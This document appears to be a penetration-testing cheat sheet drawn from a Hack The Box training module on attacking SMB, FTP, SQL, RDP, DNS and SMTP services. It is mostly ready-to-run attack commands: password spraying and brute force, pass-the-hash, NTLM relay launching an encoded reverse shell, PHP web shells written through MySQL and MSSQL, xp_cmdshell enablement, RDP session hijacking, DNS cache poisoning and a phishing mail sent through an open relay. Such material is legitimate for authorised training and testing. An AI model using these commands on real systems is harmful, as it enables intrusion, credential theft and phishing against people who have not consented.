### <span style="color:blue"> SMB </span>

- Windows
```powershell
net use n: \\192.168.220.129\Finance /user:plaintext Password123 # Cmd creds

C:\htb> dir n: /a-d /s /b | find /c ":\" # Files count

findstr /s /i cred n:\*.* # Grep for creds 

PS C:\htb> Get-ChildItem \\192.168.220.129\Finance\ # List


PS C:\htb> New-PSDrive -Name "N" -Root "\\192.168.220.129\Finance" -PSProvider "FileSystem" # Mount

# Mount using creds
PS C:\htb> $username = 'plaintext'
PS C:\htb> $password = 'Password123'
PS C:\htb> $secpassword = ConvertTo-SecureString $password -AsPlainText -Force
PS C:\htb> $cred = New-Object System.Management.Automation.PSCredential $username, $secpassword
PS C:\htb> New-PSDrive -Name "N" -Root "\\192.168.220.129\Finance" -PSProvider "FileSystem" -Credential $cred

# Filter on string
PS C:\htb> Get-ChildItem -Recurse -Path N:\ -Include *cred* -File
```

- Linux - Mount 
```shell
Sauuron@htb[/htb]$ sudo mkdir /mnt/Finance
Sauuron@htb[/htb]$ sudo mount -t cifs -o username=plaintext,password=Password123,domain=. //192.168.220.129/Finance /mnt/Finance

# Mount using credential file
Sauuron@htb[/htb]$ mount -t cifs //192.168.220.129/Finance /mnt/Finance -o credentials=/path/credentialfile

# Cred file example 


username=plaintext
password=Password123
domain=.

```

- Linux - mssql connect
```shell
dbeaver & 
```

- Tools

| **SMB**                                                                                  | **FTP**                                     | **Email**                                          | **Databases**                                                                                                                |
| ---------------------------------------------------------------------------------------- | ------------------------------------------- | -------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------- |
| [smbclient](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html)          | [ftp](https://linux.die.net/man/1/ftp)      | [Thunderbird](https://www.thunderbird.net/en-US/)  | [mssql-cli](https://github.com/dbcli/mssql-cli)                                                                              |
| [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)                              | [lftp](https://lftp.yar.ru/)                | [Claws](https://www.claws-mail.org/)               | [mycli](https://github.com/dbcli/mycli)                                                                                      |
| [SMBMap](https://github.com/ShawnDEvans/smbmap)                                          | [ncftp](https://www.ncftp.com/)             | [Geary](https://wiki.gnome.org/Apps/Geary)         | [mssqlclient.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py)                             |
| [Impacket](https://github.com/SecureAuthCorp/impacket)                                   | [filezilla](https://filezilla-project.org/) | [MailSpring](https://getmailspring.com/)           | [dbeaver](https://github.com/dbeaver/dbeaver)                                                                                |
| [psexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py)   | [crossftp](http://www.crossftp.com/)        | [mutt](http://www.mutt.org/)                       | [MySQL Workbench](https://dev.mysql.com/downloads/workbench/)                                                                |
| [smbexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py) |                                             | [mailutils](https://mailutils.org/)                | [SQL Server Management Studio or SSMS](https://docs.microsoft.com/en-us/sql/ssms/download-sql-server-management-studio-ssms) |
|                                                                                          |                                             | [sendEmail](https://github.com/mogaal/sendemail)   |                                                                                                                              |
|                                                                                          |                                             | [swaks](http://www.jetmore.org/john/code/swaks/)   |                                                                                                                              |
|                                                                                          |                                             | [sendmail](https://en.wikipedia.org/wiki/Sendmail) |                                                                                                                              |

### <span style="color:#9fef00">  Attack Concept</span>
-------

![[Pasted image 20230601122201.png]]

### <span style="color:#9fef00">  Attacking services</span>
---------
### <span style="color: blue">FTP </span>

Medusa 
```shell
Sauuron@htb[/htb]$ medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp 
```

### <span style="color :red "> FTP Bounce Attack </span>

```shell
Sauuron@htb[/htb]$ nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2 #External ip  #Internal ip
```

#### Latest Ftp Attack 

```shell
Sauuron@htb[/htb]$ curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops
```


### <span style="color: blue">SMB </span>

```shell
Sauuron@htb[/htb]$ smbclient -N -L //10.129.14.128 # Null session

Sauuron@htb[/htb]$ smbmap -H 10.129.14.128

Sauuron@htb[/htb]$ smbmap -H 10.129.14.128 -r notes # Recursive 

Sauuron@htb[/htb]$ smbmap -H 10.129.14.128 --download "notes\note.txt" # Download

Sauuron@htb[/htb]$ smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt" # Upload
```

### <span style="color: blue">RPC</span>
[cheat sheet from the SANS Institute](https://www.willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf)

```shell
Sauuron@htb[/htb]$ rpcclient -U'%' 10.10.110.17 # Null session

rpcclient $> enumdomusers # list User:[name] rid:[rid-number]
```

[enum4linux.py](https://github.com/cddmp/enum4linux-ng)

```shell
Sauuron@htb[/htb]$ ./enum4linux-ng.py 10.10.11.45 -A -C # Null authentication 
```

### <span style="color :red "> Crackmapexec BruteForce / Password spray </span>

```shell
Sauuron@htb[/htb]$ crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' # Spray `--continue-on-success`optional to continue even after valid creds
```

```shell
Sauuron@htb[/htb]$ crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec # BruteForce
```


### <span style="color :red "> Impacket</span>
Psexec 
- Deploy to $admin share using [RemComSvc](https://github.com/kavika13/RemCom)
```shell
Sauuron@htb[/htb]$ impacket-psexec administrator:'Password123!'@10.10.110.17
```

PSsmb
- Without the need to have a writable share 

atexec
- executes a command on the target machine through the Task Scheduler service and returns the output of the executed command

CrackMapExec
- includes an implementation of `smbexec` and `atexec`
 
Metasploit
- Ruby PsExec implementation.

### <span style="color:#9fef00"> Enumerating Logged-on Users</span>
------
- Logged in users
```shell
crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
```

- Extract sam
```shell
Sauuron@htb[/htb]$ crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
```

- Pass-the-hash (PtH)
```shell
Sauuron@htb[/htb]$ crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
```

#### <span style="color:#9fef00"> Forced Authentication Attacks</span>

- Capturing NetNTLM v1/v2 hashes 

Responder
```shell
Sauuron@htb[/htb]$ responder -I <interface name>
```


- The hostname file share's IP address is required.
- The local host file (C:\Windows\System32\Drivers\etc\hosts) will be checked for suitable records.
- If no records are found, the machine switches to the local DNS cache, which keeps track of recently resolved names.
- Is there no local DNS record? A query will be sent to the DNS server that has been configured.
- If all else fails, the machine will issue a multicast query, requesting the IP address of the file share from other machines on the network.

<mark style="background: #FF5582A6;color:white">**Note:** If you notice multiples hashes for one account this is because NTLMv2 utilizes both a client-side and server-side challenge that is randomized for each interaction. This makes it so the resulting hashes that are sent are salted with a randomized string of numbers. This is why the hashes don't match but still represent the same password.</mark>

hashcat crack NTLMv2
```shell
Sauuron@htb[/htb]$ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

```shell
Sauuron@htb[/htb]$ cat /etc/responder/Responder.conf | grep 'SMB ='

SMB = Off # set to ON
```

impacket-ntlmrelayx
```shell
Sauuron@htb[/htb]$ impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146 # -c to dummp sam database
```

Execute command 
```shell-session
Sauuron@htb[/htb]$ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e <Rev-shell>'
```

### <span style="color :red "> SMBGhost</span> [integer overflow](https://en.wikipedia.org/wiki/Integer_overflow)
Effected Windows 10 versions 1903  & 1909

### <span style="color: blue">SQL </span>
- Connect

mysql
```shell
Sauuron@htb[/htb]$ mysql -u julio -pPassword123 -h 10.129.20.13
```

mssql

```shell
C:\htb> sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30 # Windows
```

```shell
Sauuron@htb[/htb]$ sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h # Linux
Sauuron@htb[/htb]$ mssqlclient.py -p 1433 julio@10.129.203.7 

Sauuron@htb[/htb]$ sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h # Windows authentication
```


<mark style="background: #FF5582A6;color:#ffffff"> Important!</mark>

 <span style="color:#9fef00">Mysql</span> default system schemas/databases:

- <span style="color:#9fef00">mysql</span> - is the system database that contains tables that store information required by the MySQL server
- <span style="color:#9fef00">information_schema</span> - provides access to database metadata
- <span style="color:#9fef00">performance_schema</span> - is a feature for monitoring MySQL Server execution at a low level
- <span style="color:#9fef00">sys</span> - a set of objects that helps DBAs and developers interpret data collected by the Performance Schema


<span style="color:#9fef00">MSSQL</span> default system schemas/databases:

- <span style="color:#9fef00">master</span> - keeps the information for an instance of SQL Server.
- <span style="color:#9fef00">msdb</span> - used by SQL Server Agent.
- <span style="color:#9fef00">model</span>- a template database copied for each new database.
- <span style="color:#9fef00">resource</span>- a read-only database that keeps system objects visible in every database on the server in sys schema.
- <span style="color:#9fef00">tempdb</span> - keeps temporary objects for SQL queries.


### <span style="color :red "> Execute Commands</span>

- Enable [xp_cmdshell](https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option?view=sql-server-ver16) (Server configuration option)

```sql
-- To allow advanced options to be changed. 
	EXECUTE sp_configure 'show advanced options', 1; GO

-- To update the currently configured value for advanced options.
RECONFIGURE;
GO

-- To enable the feature. 
EXECUTE sp_configure 'xp_cmdshell', 1; 
GO

-- To update the currently configured value for this feature. 
RECONFIGURE; 
GO
```


<mark style="background: #FF5582A6;">There are other methods to get command execution, such as adding [extended stored procedures](https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/adding-an-extended-stored-procedure-to-sql-server), [CLR Assemblies](https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration), [SQL Server Agent Jobs](https://docs.microsoft.com/en-us/sql/ssms/agent/schedule-a-job?view=sql-server-ver15), and [external scripts](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-execute-external-script-transact-sql). However, besides those methods there are also additional functionalities that can be used like the `xp_regwrite` command that is used to elevate privileges by creating new entries in the Windows registry. Nevertheless, those methods are outside the scope of this module.

`MySQL` supports [User Defined Functions](https://dotnettutorials.net/lesson/user-defined-functions-in-mysql/) which allows us to execute C/C++ code as a function within SQL, there's one User Defined Function for command execution in this [GitHub repository](https://github.com/mysqludf/lib_mysqludf_sys). It is not common to encounter a user-defined function like this in a production environment, but we should be aware that we may be able to use it.</mark>

### <span style="color :red "> Write Local Files</span>
Check if can read/write to files

```shell
mysql> show variables like "secure_file_priv";
```
- If empty, the variable has no effect, which is not a secure setting.
- If set to the name of a directory, the server limits import and export operations to work only with files in that directory. The directory must exist; the server does not create it.
- If set to NULL, the server disables import and export operations.

```shell
mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
```

- To write files using `MSSQL`, we need to enable [Ole Automation Procedures](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option), which requires admin privileges, and then execute some stored procedures to create the file:

```sql
1> sp_configure 'show advanced options', 1
2> GO
3> RECONFIGURE
4> GO
5> sp_configure 'Ole Automation Procedures', 1
6> GO
7> RECONFIGURE
8> GO
```

#### MSSQL - Create a File

```sql
1> DECLARE @OLE INT
2> DECLARE @FileID INT
3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
6> EXECUTE sp_OADestroy @FileID
7> EXECUTE sp_OADestroy @OLE
8> GO
```

## Read Local Files
MSSQL

```sql
1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
2> GO
```

mysql

```sql
mysql> select LOAD_FILE("/etc/passwd");
```

## Capture MSSQL Service Hash

After running `responder` or `impacket-smbserver`
```sql
1> EXEC master..xp_dirtree '\\10.10.110.17\share\'
2> GO

subdirectory    depth
--------------- -----------
```


## Impersonate Existing Users with MSSQL

#### Identify Users that We Can Impersonate

```sql
1> SELECT distinct b.name
2> FROM sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
6> GO

name
-----------------------------------------------
sa
ben
valentin

(3 rows affected)
```

#### Verifying our Current User and Role

```shell
1> SELECT SYSTEM_USER
2> SELECT IS_SRVROLEMEMBER('sysadmin')
3> go
```


#### Impersonating the SA User

```sql
1> EXECUTE AS LOGIN = 'sa'
2> SELECT SYSTEM_USER
3> SELECT IS_SRVROLEMEMBER('sysadmin')
4> GO
```

<mark style="background: #BBFABBA6;">**Note:** It's recommended to run `EXECUTE AS LOGIN` within the master DB, because all users, by default, have access to that database. If a user you are trying to impersonate doesn't have access to the DB you are connecting to it will present an error. Try to move to the master DB using `USE master`.</mark>

#### Identify linked Servers in MSSQL

```sql
1> SELECT srvname, isremote FROM sysservers
2> GO

srvname                             isremote
----------------------------------- --------
DESKTOP-MFERMN4\SQLEXPRESS          1 /* Remote Server */
10.0.0.12\SQLEXPRESS                0 /* Linked Server */

(2 rows affected)
```
1: Remote server
0: linked server

#### MSSQL Execute on Remote Server 

```sql
1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
2> GO

------------------------------ ------------------------------ ------------------------------ -----------
DESKTOP-0L9D4KA\SQLEXPRESS     Microsoft SQL Server 2019 (RTM sa_remote                                1

(1 rows affected)
```

### <span style="color: blue">RDP </span>

 password spray
```shell
crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
```

```shell
hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
```

Session Hijacking

```powershell
C:\htb> tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}

C:\htb> query user # query users 

C:\htb> sc.exe create sessionhijack binpath= "cmd.exe /k tscon 1 /dest:rdp-tcp#0" # Hijack

C:\htb> net start sessionhijack # Start command 
```

_Note: This method no longer works on Server 2019._


### RDP Pass-the-Hash (PtH)

Adding the DisableResrictedAdmin Registry Key

```powershell
C:\htb> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

```powershell
xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9
```

 Which registry key needs to be changed to allow Pass-the-Hash with the RDP protocol?

### <span style="color: blue">DNS </span>

#### DIG - AXFR Zone Transfer

```css
dig AXFR @ns1.inlanefreight.htb inlanefreight.htb
```

```css
fierce --domain zonetransfer.me
```

#### Subbrute

```css
Sauuron@htb[/htb]$ git clone https://github.com/TheRook/subbrute.git >> /dev/null 2>&1
Sauuron@htb[/htb]$ cd subbrute
Sauuron@htb[/htb]$ echo "ns1.inlanefreight.com" > ./resolvers.txt
Sauuron@htb[/htb]$ ./subbrute inlanefreight.com -s ./names.txt -r ./resolvers.txt

Warning: Fewer than 16 resolvers per process, consider adding more nameservers to resolvers.txt.
inlanefreight.com
ns2.inlanefreight.com
www.inlanefreight.com
ms1.inlanefreight.com
support.inlanefreight.com

<SNIP>
```

```css
host support.inlanefreight.com
```

## DNS Spoofing

DNS spoofing is also referred to as DNS Cache Poisoning. This attack involves alerting legitimate DNS records with false information so that they can be used to redirect online traffic to a fraudulent website. Example attack paths for the DNS Cache Poisoning are as follows:

- An attacker could intercept the communication between a user and a DNS server to route the user to a fraudulent destination instead of a legitimate one by performing a Man-in-the-Middle (`MITM`) attack.
    
- Exploiting a vulnerability found in a DNS server could yield control over the server by an attacker to modify the DNS records.

#### Local DNS Cache Poisoning

From a local network perspective, an attacker can also perform DNS Cache Poisoning using MITM tools like [Ettercap](https://www.ettercap-project.org/) or [Bettercap](https://www.bettercap.org/).

To exploit the DNS cache poisoning via `Ettercap`, we should first edit the `/etc/ettercap/etter.dns` file to map the target domain name (e.g., `inlanefreight.com`) that they want to spoof and the attacker's IP address (e.g., `192.168.225.110`) that they want to redirect a user to:

```css
Sauuron@htb[/htb]# cat /etc/ettercap/etter.dns

inlanefreight.com      A   192.168.225.110
*.inlanefreight.com    A   192.168.225.110
```

Next, start the `Ettercap` tool and scan for live hosts within the network by navigating to `Hosts > Scan for Hosts`. Once completed, add the target IP address (e.g., `192.168.152.129`) to Target1 and add a default gateway IP (e.g., `192.168.152.2`) to Target2.

_reference_-> https://academy.hackthebox.com/module/116/section/1512

### <span style="color: blue">SMTP </span>

#### Host - MX Records

```shell
Sauuron@htb[/htb]$ host -t MX hackthebox.eu
```

```shell
Sauuron@htb[/htb]$ dig mx plaintext.do | grep "MX" | grep -v ";"
```

#### DIG - A Record for MX

```shell
Sauuron@htb[/htb]$ host -t A mail1.inlanefreight.htb.
```

| PORT      | SERVICE           |
| --------- | ----------------- |
| `TCP/25`  | SMTP Unencrypted  | 
| `TCP/143` | IMAP4 Unencrypted |
| `TCP/110` | POP3 Unencrypted  |
| `TCP/465` | SMTP Encrypted    |
| `TCP/993` | IMAP4 Encrypted   |
| `TCP/995` | POP3 Encrypted    |


#### DIG - MX Records

```shell
Sauuron@htb[/htb]$ dig mx plaintext.do | grep "MX" | grep -v ";"
```

```shell-session
Sauuron@htb[/htb]$ dig mx inlanefreight.com | grep "MX" | grep -v ";"
```

```shell
Sauuron@htb[/htb]$ host -t A mail1.inlanefreight.htb.
```

#### nmap

```shell
Sauuron@htb[/htb]$ sudo nmap -Pn -sV -sC -p25,143,110,465,993,995 10.129.14.128
```


#### VRFY Command

```shell
Sauuron@htb[/htb]$ telnet 10.10.110.20 25
Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
220 parrot ESMTP Postfix (Debian/GNU)


VRFY root

252 2.0.0 root


VRFY www-data

252 2.0.0 www-data


VRFY new-user

550 5.1.1 <new-user>: Recipient address rejected: User unknown in local recipient table
```

#### EXPN Command

```shell
Sauuron@htb[/htb]$ telnet 10.10.110.20 25

Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
220 parrot ESMTP Postfix (Debian/GNU)


EXPN john

250 2.1.0 john@inlanefreight.htb


EXPN support-team

250 2.0.0 carol@inlanefreight.htb
250 2.1.5 elisa@inlanefreight.htb
```

#### RCPT TO Command

```shell
Sauuron@htb[/htb]$ telnet 10.10.110.20 25

Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
220 parrot ESMTP Postfix (Debian/GNU)


MAIL FROM:test@htb.com
it is
250 2.1.0 test@htb.com... Sender ok


RCPT TO:julio

550 5.1.1 julio... User unknown


RCPT TO:kate

550 5.1.1 kate... User unknown


RCPT TO:john

250 2.1.5 john... Recipient ok
```


#### smtp-user-enum

```shell
Sauuron@htb[/htb]$ smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7
```

#### O365 Spray
[O365spray](https://github.com/0xZDH/o365spray) 
[MailSniper](https://github.com/dafthack/MailSniper)  or [CredKing](https://github.com/ustayready/CredKing) 

```shell
Sauuron@htb[/htb]$ python3 o365spray.py --validate --domain msplaintext.xyz

# Enumerate users
Sauuron@htb[/htb]$ python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz        
```


## Password Attacks

```shell-session
Sauuron@htb[/htb]$ hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3
```


#### O365 Spray - Password Spraying

```shell
Sauuron@htb[/htb]$ python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz
```


#### Open Relay

```css
Sauuron@htb[/htb]# nmap -p25 -Pn --script smtp-open-relay 10.10.11.213

Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-28 23:59 EDT
Nmap scan report for 10.10.11.213
Host is up (0.28s latency).

PORT   STATE SERVICE
25/tcp open  smtp
|_smtp-open-relay: Server is an open relay (14/16 tests)
```

send mail
```css
Sauuron@htb[/htb]# swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server 10.10.11.213
```

